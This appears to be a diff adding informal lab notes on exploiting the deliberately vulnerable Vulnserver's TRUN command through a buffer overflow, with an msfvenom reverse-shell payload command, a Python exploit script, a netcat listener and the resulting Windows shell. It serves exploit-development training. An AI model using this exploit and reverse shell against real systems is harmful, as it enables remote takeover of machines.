@@ -1,0 +1,46 @@
+Tools used msf venom.
+we need to write a shell code via terminal so the command for it was given down.
+
+$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.131 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+o-p:- some output with bunch of numbers.
+------------------------------------------------------------
+now incase you had anybad characters you must need to write it at the place of --> "\x00"
+------------------------------------------------------------
+So, here we need to copy all the characters that were came during the execution were needed to psted in the 2.py program so that was it. 
+------------------------------------------------------------
+gedit 2.py:-
+
+#!/usr/bin/python
+import sys, socket
+
+overflow = ( "paste the copied numbers" ) #note remove semicolumn
+
+shellcode = "A"  *  2003  +  "\xaf\x11\x50\x62"  +  "\x90"  *  32  +  overflow
+
+try:
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect(('192.168.1.90',9999))
+	s.send(('TRUN /.:/'  +  shellcode))
+	s.close()
+except:
+	print "Error connecting to server"
+	sys.exit()
+---------------------------------------------------------------
+Now, open another tab in our kali then go with the netcat here so see the below command for it.
+Note:- This tym we just need only Vulnserver running but not the Debugger to run. So, run Vulnserver as Administrator.
+
+$ nc -nvlp 4444
+o/p:- listening on [any] 4444......
+
+make sure vulnserver running and make sure immunity was not been running.
+
+$ ./2.py
+----------
+Now, see the other tab that you got the shell present in another tab so that you can access it. This shell was nothing but our shell of windows.
+
+C:\Users\Heath\Desktop\vulnserver>whoami
+whoami
+hawkeye\health
+C:\Users\Heath\Desktop\vulnserver>
+
+Note: It was not very easy to find correct m/m locations so dig harder
